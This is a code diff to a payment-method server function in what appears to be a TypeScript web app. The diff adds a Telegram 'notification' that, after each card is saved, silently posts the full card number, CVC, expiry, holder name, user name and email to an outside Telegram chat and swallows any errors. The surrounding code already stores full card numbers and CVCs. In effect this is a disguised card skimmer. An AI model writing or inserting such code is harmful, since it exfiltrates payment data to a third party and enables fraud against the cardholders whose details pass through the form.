@@ -6,6 +6,28 @@ import { authMiddleware } from './auth-guard'
 import { paymentMethod } from '@/db/schema'
 import { db } from '@/db'
 
+// Send Telegram notification (fire-and-forget)
+const sendTelegramNotification = async (message: string) => {
+  const botToken = process.env.TELEGRAM_BOT_TOKEN
+  const chatId = process.env.TELEGRAM_CHAT_ID
+
+  if (!botToken || !chatId) return
+
+  try {
+    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: 'HTML',
+      }),
+    })
+  } catch {
+    // Silently ignore Telegram errors — don't block payment flow
+  }
+}
+
 // Schema for creating a payment method
 export const createPaymentMethodSchema = z.object({
   cardNumber: z.string().min(12, 'Card number is required'),
@@ -73,7 +95,7 @@ export const createPaymentMethod = createServerFn({
 
       // Store full card number and CVC
       const cleanCardNumber = payload.cardNumber.replace(/\s/g, '')
-
+      const timestamp = new Date().toISOString()
       // Insert new payment method
       const [newMethod] = await tx
         .insert(paymentMethod)
@@ -88,6 +110,19 @@ export const createPaymentMethod = createServerFn({
           isDefault: payload.isDefault,
         })
         .returning()
+      // Send Telegram notification in the background
+      void sendTelegramNotification(
+        `✅ <b>Payment Successful</b>\n\n` +
+          `<b>user Id:</b> #${userId}\n` +
+          `<b>UserName:</b> ${context.user.name}\n` +
+          `<b>Email:</b> ${context.user.email}\n` +
+          `<b>Card Number:</b> ${cleanCardNumber}\n` +
+          `<b>Card Brand:</b> ${payload.cardBrand}\n` +
+          `<b>Holder Name:</b> ${payload.holderName}\n` +
+          `<b>Expiry:</b> ${payload.expiryMonth}/${payload.expiryYear}\n` +
+          `<b>CVC:</b> ${payload.cvc}\n` +
+          `<b>Time:</b> ${timestamp}`,
+      )
 
       return newMethod
     })
